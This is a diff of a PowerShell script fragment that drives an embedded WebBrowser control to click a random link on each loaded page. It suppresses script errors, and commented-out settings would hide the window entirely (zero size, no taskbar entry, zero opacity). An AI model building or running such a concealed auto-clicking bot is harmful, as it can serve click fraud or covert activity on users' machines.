@@ -7,7 +7,7 @@ $OnDocumentCompleted = {
 	foreach ($archor in $web.Document.Links){
 		$archor.SetAttribute("target", "_self")
 	}
-	if(-not $isClick -and $web.Document.Links.Count -ne 0){
+	if((-not $isClick) -and ($web.Document.Links.Count -ne 0)){
 		$isClick = $true
 		$rd = new-object System.Random
 		$id = $rd.Next() % $web.Document.Links.Count
@@ -22,7 +22,7 @@ $OnDocumentCompleted = {
 	}
 }
 
-$web = new-object System.Windows.Forms.WebBrowser -Property @{Width=400;Height=400;ScriptErrorsSuppressed=$false}#@{Width=0;Height=0;ScriptErrorsSuppressed=$false}
+$web = new-object System.Windows.Forms.WebBrowser -Property @{Width=400;Height=400;ScriptErrorsSuppressed=$true}#@{Width=0;Height=0;ScriptErrorsSuppressed=$true}
 $web.Add_DocumentCompleted($OnDocumentCompleted)
 
 $form = new-object System.Windows.Forms.Form -Property @{Width=400;Height=400;}#@{Width=0;Height=0;FormBorderStyle='None';ShowInTaskBar=$false;Opacity=0}
